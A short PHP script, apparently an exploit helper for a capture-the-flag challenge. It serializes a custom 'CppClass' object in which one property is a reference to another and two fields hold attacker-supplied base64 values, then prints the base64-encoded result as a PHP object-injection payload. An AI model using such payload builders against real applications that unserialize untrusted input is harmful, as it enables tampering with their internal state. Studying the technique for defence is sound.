<?php

Class CppClass {
  var $name,$format,$format_str,$other;
}
if($argc<=2){
$obj = new \CppClass;
echo serialize($obj);
}
else
{
        $format = base64_decode($argv[1]);
        $exp = base64_decode($argv[2]);
        $obj = new \CppClass;
        $obj->name = $format;
        $obj->format = &$obj->format_str;
        $obj->other = $exp;
        echo base64_encode(serialize($obj));
}
?>
